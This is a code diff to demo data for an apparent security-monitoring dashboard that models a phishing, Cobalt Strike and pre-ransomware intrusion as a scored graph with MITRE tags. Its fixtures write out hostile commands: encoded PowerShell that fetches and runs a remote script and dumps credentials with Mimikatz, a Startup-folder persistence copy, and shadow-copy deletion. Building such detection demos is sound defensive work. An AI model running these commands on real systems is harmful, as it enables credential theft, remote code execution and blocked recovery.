@@ -82,7 +82,7 @@ export const DEMO_USERS: Record<string, UserProfile> = {
       },
       {
         id: 'proc_mimikatz',
-        name: 'powershell.exe -enc SQB... (Mimikatz)',
+        name: 'powershell.exe @ LAPTOP-JS-882',
         type: 'process',
         riskScore: 92,
         riskBand: 'HIGH',
@@ -90,7 +90,8 @@ export const DEMO_USERS: Record<string, UserProfile> = {
         classification: 'Credential Dumping Tool',
         firstSeenHour: 32,
         firstSeenInBaseline: false,
-        details: { ProcessGUID: '{9f82c4-1102}', Parent: 'explorer.exe', Signer: 'Unsigned Script', Hash: 'e3b0c44298fc1c149afbf4c8996fb924' }
+        details: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Host: 'LAPTOP-JS-882', ProcessGUID: '{9f82c4-1102}', Parent: 'explorer.exe', Signer: 'Microsoft (script unsigned)' },
+        executions: [{ ts: 'H32', commandLine: 'powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgANAA0ADMALwBhACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==', parent: 'C:\\Windows\\explorer.exe', user: 'j.smith', eventId: 'evt-321', count: 2, source: 'Sysmon 1' }]
       },
       {
         id: 'host_jump',
@@ -252,31 +253,68 @@ export const DEMO_USERS: Record<string, UserProfile> = {
     isVip: true,
     isLeaver: false,
     isServiceAccount: false,
-    alertSummary: 'Malicious PDF macro execution followed by Ransomware Canary file modifications.',
+    alertSummary: 'Phishing attachment → Cobalt Strike beacon → share discovery → shadow copies deleted and ransomware canary tripped.',
     triggerEvent: 'Phishing Execution & Pre-Ransomware Lateral Staging',
     aliases: ['mross', 'm.ross@corp.com', 'CORP\\mross'],
     contributingFactors: [
       { indicator: 'Correlated alert (EDR)', weight: 30, mitreTactic: 'T1566', eventIds: ['evt-mr42'], description: 'EDR heuristic match on CobaltStrike Beacon in Temp' },
+      { indicator: 'Encoded PowerShell', weight: 15, mitreTactic: 'T1059.001', eventIds: ['evt-mr40'], description: 'Hidden PowerShell with an encoded command, started by rundll32' },
       { indicator: 'Mass file access (Ransomware staging)', weight: 15, mitreTactic: 'T1005', eventIds: ['evt-mr15'], description: 'Enumerated 42,000 files across network shares in 1 hour' },
+      { indicator: 'Inhibit system recovery', weight: 20, mitreTactic: 'T1490', eventIds: ['evt-mr03'], description: 'vssadmin deleted all shadow copies' },
       { indicator: 'VIP user multiplier', weight: 4, mitreTactic: 'Context', eventIds: [], description: '1.2x score multiplier for Executive Sales Director' }
     ],
     nodes: [
       { id: 'u_mross', name: 'm.ross', type: 'user', riskScore: 91, riskBand: 'HIGH', compromised: true, classification: 'Sales Executive Identity', firstSeenHour: 48, firstSeenInBaseline: true, isVip: true, aliases: ['mross', 'm.ross@corp.com'], details: { Department: 'Enterprise Sales' } },
       { id: 'host_sales', name: 'THINKPAD-MR-20', type: 'host', riskScore: 88, riskBand: 'HIGH', compromised: true, classification: 'Executive Laptop', firstSeenHour: 48, firstSeenInBaseline: true, details: { OS: 'Windows 11 Pro', IP: '10.15.8.32' } },
-      { id: 'file_phish', name: 'Overdue_Invoice_982.pdf.exe', type: 'file', riskScore: 99, riskBand: 'HIGH', compromised: true, classification: 'Malicious Dropper Payload', firstSeenHour: 42, firstSeenInBaseline: false, details: { Signature: 'CobaltStrike Beacon' } },
-      { id: 'ip_c2', name: '185.220.101.5', type: 'ip', riskScore: 100, riskBand: 'HIGH', compromised: true, classification: 'Active C2 Beacon Server', firstSeenHour: 41, firstSeenInBaseline: false, details: { ThreatActor: 'FIN7 / BlackCat', Port: '8443 TLS' } },
-      { id: 'host_share', name: 'FS-CORP-SHARE01', type: 'host', riskScore: 84, riskBand: 'HIGH', compromised: true, classification: 'Corporate File Storage', firstSeenHour: 15, firstSeenInBaseline: false, isCrownJewel: true, details: { Shares: 'Legal, Contracts, Sales' } }
+      { id: 'proc_outlook', name: 'OUTLOOK.EXE @ THINKPAD-MR-20', type: 'process', riskScore: 40, riskBand: 'MEDIUM', compromised: false, classification: 'Mail client', firstSeenHour: 44, firstSeenInBaseline: true,
+        details: { Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\explorer.exe' },
+        executions: [{ ts: 'H44', commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" /recycle', parent: 'C:\\Windows\\explorer.exe', user: 'm.ross', eventId: 'evt-mr44', count: 1, source: 'Sysmon 1' }] },
+      { id: 'file_phish', name: 'Overdue_Invoice_982.pdf.exe', type: 'file', riskScore: 99, riskBand: 'HIGH', compromised: true, classification: 'Malicious dropper (email attachment)', firstSeenHour: 42, firstSeenInBaseline: false,
+        details: { Path: 'C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe', SHA256: '9f2c1d4e8b0a7c3f5e6d2b1a0c9e8f7d6c5b4a3928171605f4e3d2c1b0a99887', Signature: 'Unsigned' } },
+      { id: 'proc_invoice', name: 'Overdue_Invoice_982.pdf.exe @ THINKPAD-MR-20', type: 'process', riskScore: 99, riskBand: 'HIGH', compromised: true, classification: 'Malicious process (CobaltStrike loader)', firstSeenHour: 42, firstSeenInBaseline: false,
+        details: { Image: 'C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', Signature: 'CobaltStrike Beacon (EDR heuristic)' },
+        executions: [{ ts: 'H42', commandLine: '"C:\\Users\\mross\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QK2Z1\\Overdue_Invoice_982.pdf.exe"', parent: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', user: 'm.ross', eventId: 'evt-mr42', count: 1, source: 'Sysmon 1' }] },
+      { id: 'ip_c2', name: '185.220.101.5', type: 'ip', riskScore: 100, riskBand: 'HIGH', compromised: true, classification: 'Active C2 Beacon Server', firstSeenHour: 41, firstSeenInBaseline: false, details: { ThreatActor: 'FIN7 / BlackCat', Port: '8443 TLS', Scope: 'External' } },
+      { id: 'proc_rundll', name: 'rundll32.exe @ THINKPAD-MR-20', type: 'process', riskScore: 95, riskBand: 'HIGH', compromised: true, classification: 'Injected beacon host process', firstSeenHour: 41, firstSeenInBaseline: false,
+        details: { Image: 'C:\\Windows\\System32\\rundll32.exe', Host: 'THINKPAD-MR-20', Parent: 'Overdue_Invoice_982.pdf.exe' },
+        executions: [{ ts: 'H41', commandLine: 'C:\\Windows\\System32\\rundll32.exe C:\\Users\\mross\\AppData\\Roaming\\msupd.dll,StartW', parent: 'Overdue_Invoice_982.pdf.exe', user: 'm.ross', eventId: 'evt-mr41b', count: 1, source: 'Sysmon 1' }] },
+      { id: 'proc_ps', name: 'powershell.exe @ THINKPAD-MR-20', type: 'process', riskScore: 90, riskBand: 'HIGH', compromised: true, classification: 'Hands-on-keyboard PowerShell', firstSeenHour: 40, firstSeenInBaseline: false,
+        details: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\System32\\rundll32.exe' },
+        executions: [
+          { ts: 'H40', commandLine: 'powershell.exe -NoP -W Hidden -enc bgBlAHQAIAB2AGkAZQB3ACAALwBkAG8AbQBhAGkAbgA7ACAAbgBsAHQAZQBzAHQAIAAvAGQAYwBsAGkAcwB0ADoAYwBvAHIAcAAuAGwAbwBjAGEAbAA=', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr40', count: 1, source: 'Sysmon 1' },
+          { ts: 'H39', commandLine: 'powershell.exe -NoP -W Hidden -c "Copy-Item C:\\Users\\mross\\AppData\\Roaming\\msupd.dll $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.lnk"', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr39', count: 1, source: 'Sysmon 1' },
+        ] },
+      { id: 'file_persist', name: 'OneDriveSync.lnk', type: 'file', riskScore: 80, riskBand: 'HIGH', compromised: true, classification: 'Startup-folder persistence', firstSeenHour: 39, firstSeenInBaseline: false,
+        details: { Path: 'C:\\Users\\mross\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.lnk' } },
+      { id: 'host_share', name: 'FS-CORP-SHARE01', type: 'host', riskScore: 84, riskBand: 'HIGH', compromised: true, classification: 'Corporate File Storage', firstSeenHour: 15, firstSeenInBaseline: false, isCrownJewel: true, details: { Shares: 'Legal, Contracts, Sales' } },
+      { id: 'proc_vss', name: 'vssadmin.exe @ THINKPAD-MR-20', type: 'process', riskScore: 97, riskBand: 'HIGH', compromised: true, classification: 'Pre-ransomware: shadow copy deletion', firstSeenHour: 3, firstSeenInBaseline: false,
+        details: { Image: 'C:\\Windows\\System32\\vssadmin.exe', Host: 'THINKPAD-MR-20', Parent: 'C:\\Windows\\System32\\rundll32.exe' },
+        executions: [{ ts: 'H3', commandLine: 'vssadmin.exe delete shadows /all /quiet', parent: 'C:\\Windows\\System32\\rundll32.exe', user: 'm.ross', eventId: 'evt-mr03', count: 1, source: 'Sysmon 1' }] },
+      { id: 'file_canary', name: 'Q3_Contracts_CANARY.docx.locked', type: 'file', riskScore: 100, riskBand: 'HIGH', compromised: true, classification: 'Ransomware canary file modified', firstSeenHour: 2, firstSeenInBaseline: false,
+        details: { Path: '\\\\FS-CORP-SHARE01\\Legal\\Q3_Contracts_CANARY.docx.locked', Note: 'Canary file renamed with .locked extension' } }
     ],
     edges: [
-      { id: 're1', source: 'u_mross', target: 'file_phish', action: 'EXECUTED', type: 'EXECUTED', protocol: 'Outlook / Local', hour: 42, eventCount: 1, status: 'critical', details: 'User double-clicked disguised PDF invoice', firstSeenInBaseline: false, ttp: ['T1566'] },
-      { id: 're2', source: 'u_mross', target: 'ip_c2', action: 'CONNECTED_TO', type: 'CONNECTED_TO', protocol: 'HTTPS/8443', hour: 41, eventCount: 420, status: 'critical', details: 'Encrypted heartbeats every 60s to C2 server', firstSeenInBaseline: false, ttp: ['T1071'] },
-      { id: 're3', source: 'u_mross', target: 'host_share', action: 'ACCESSED', type: 'ACCESSED', protocol: 'SMB/445', hour: 15, eventCount: 42000, status: 'critical', details: 'Mass file enumeration across network shares', firstSeenInBaseline: false, ttp: ['T1083'] }
+      { id: 're0', source: 'u_mross', target: 'host_sales', action: 'AUTH_SUCCESS', type: 'AUTH_SUCCESS', protocol: 'Interactive', hour: 46, eventCount: 3, status: 'allowed', details: 'Normal interactive logon to the executive laptop', firstSeenInBaseline: true, eventIds: ['evt-mr46'] },
+      { id: 're0b', source: 'u_mross', target: 'proc_outlook', action: 'EXECUTED', type: 'EXECUTED', protocol: 'Process start', hour: 44, eventCount: 1, status: 'allowed', details: 'User opened Outlook', firstSeenInBaseline: true, eventIds: ['evt-mr44'] },
+      { id: 're1', source: 'proc_outlook', target: 'file_phish', action: 'WROTE', type: 'WROTE', protocol: 'Sysmon 11', hour: 42, eventCount: 1, status: 'critical', details: 'Outlook saved the email attachment Overdue_Invoice_982.pdf.exe to its cache folder', firstSeenInBaseline: false, ttp: ['T1566.001'], eventIds: ['evt-mr42a'] },
+      { id: 're1b', source: 'proc_outlook', target: 'proc_invoice', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 42, eventCount: 1, status: 'critical', details: 'User double-clicked the disguised PDF invoice; Outlook started the executable', firstSeenInBaseline: false, ttp: ['T1204.002'], eventIds: ['evt-mr42'] },
+      { id: 're2', source: 'proc_invoice', target: 'ip_c2', action: 'CONNECTED_TO', type: 'CONNECTED_TO', protocol: 'TCP/8443', hour: 41, eventCount: 420, status: 'critical', details: 'Encrypted heartbeats every 60s to the C2 server', firstSeenInBaseline: false, ttp: ['T1071.001'], eventIds: ['evt-mr41'] },
+      { id: 're2b', source: 'proc_invoice', target: 'proc_rundll', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 41, eventCount: 1, status: 'critical', details: 'Loader started rundll32 with a DLL dropped in AppData (beacon moves into a signed binary)', firstSeenInBaseline: false, ttp: ['T1218.011'], eventIds: ['evt-mr41b'] },
+      { id: 're2c', source: 'proc_rundll', target: 'proc_ps', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 40, eventCount: 2, status: 'critical', details: 'Beacon ran hidden, encoded PowerShell for domain discovery', firstSeenInBaseline: false, ttp: ['T1059.001', 'T1087.002'], eventIds: ['evt-mr40', 'evt-mr39'] },
+      { id: 're2d', source: 'proc_ps', target: 'file_persist', action: 'WROTE', type: 'WROTE', protocol: 'Sysmon 11', hour: 39, eventCount: 1, status: 'critical', details: 'PowerShell dropped a shortcut in the Startup folder so the beacon survives reboot', firstSeenInBaseline: false, ttp: ['T1547.001'], eventIds: ['evt-mr39b'] },
+      { id: 're3', source: 'proc_rundll', target: 'host_share', action: 'ACCESSED', type: 'ACCESSED', protocol: 'SMB/445', hour: 15, eventCount: 42000, status: 'critical', details: 'Beacon enumerated 42,000 files across the Legal, Contracts and Sales shares', firstSeenInBaseline: false, ttp: ['T1083', 'T1135'], eventIds: ['evt-mr15'] },
+      { id: 're4', source: 'proc_rundll', target: 'proc_vss', action: 'SPAWNED', type: 'SPAWNED', protocol: 'Child process', hour: 3, eventCount: 1, status: 'critical', details: 'Shadow copies deleted to block recovery (pre-ransomware)', firstSeenInBaseline: false, ttp: ['T1490'], eventIds: ['evt-mr03'] },
+      { id: 're5', source: 'proc_rundll', target: 'file_canary', action: 'WROTE', type: 'WROTE', protocol: 'SMB/445', hour: 2, eventCount: 1, status: 'critical', details: 'Canary file on the Legal share renamed to .locked: encryption has started', firstSeenInBaseline: false, ttp: ['T1486'], eventIds: ['evt-mr02'] }
     ],
     milestones: [
       { hour: 48, timeLabel: 'T-48:00', title: 'Normal Sales Operations', severity: 'low', description: 'User answering email via Outlook 365.', mitreTactic: 'Normal Operations' },
-      { hour: 42, timeLabel: 'T-42:00', title: 'Phishing Execution', severity: 'critical', description: 'Malicious executable executed by user from Outlook email.', mitreTactic: 'Initial Access (T1566)' },
-      { hour: 41, timeLabel: 'T-41:00', title: 'Cobalt Strike C2 Beaconing', severity: 'critical', description: 'Persistent beacon established to malicious IP 185.220.101.5.', mitreTactic: 'Command and Control (T1071)' },
-      { hour: 15, timeLabel: 'T-15:00', title: 'Internal Recon & Share Discovery', severity: 'high', description: 'Attacker automated scan of corporate file shares.', mitreTactic: 'Discovery (T1083)' }
+      { hour: 42, timeLabel: 'T-42:00', title: 'Phishing Execution', severity: 'critical', description: 'Malicious executable executed by user from Outlook email.', mitreTactic: 'Initial Access (T1566)', edgeId: 're1b' },
+      { hour: 41, timeLabel: 'T-41:00', title: 'Cobalt Strike C2 Beaconing', severity: 'critical', description: 'Persistent beacon established to malicious IP 185.220.101.5.', mitreTactic: 'Command and Control (T1071)', edgeId: 're2' },
+      { hour: 40, timeLabel: 'T-40:00', title: 'Encoded PowerShell discovery', severity: 'critical', description: 'Hidden, encoded PowerShell ran net view / nltest from the beacon.', mitreTactic: 'Execution (T1059.001)', edgeId: 're2c' },
+      { hour: 39, timeLabel: 'T-39:00', title: 'Startup-folder persistence', severity: 'high', description: 'Shortcut dropped in the Startup folder.', mitreTactic: 'Persistence (T1547.001)', edgeId: 're2d' },
+      { hour: 15, timeLabel: 'T-15:00', title: 'Internal Recon & Share Discovery', severity: 'high', description: 'Attacker automated scan of corporate file shares.', mitreTactic: 'Discovery (T1083)', edgeId: 're3' },
+      { hour: 3, timeLabel: 'T-03:00', title: 'Shadow copies deleted', severity: 'critical', description: 'vssadmin delete shadows /all /quiet.', mitreTactic: 'Impact (T1490)', edgeId: 're4' },
+      { hour: 2, timeLabel: 'T-02:00', title: 'Ransomware canary tripped', severity: 'critical', description: 'Canary file on the Legal share renamed to .locked.', mitreTactic: 'Impact (T1486)', edgeId: 're5' }
     ]
   }
 };
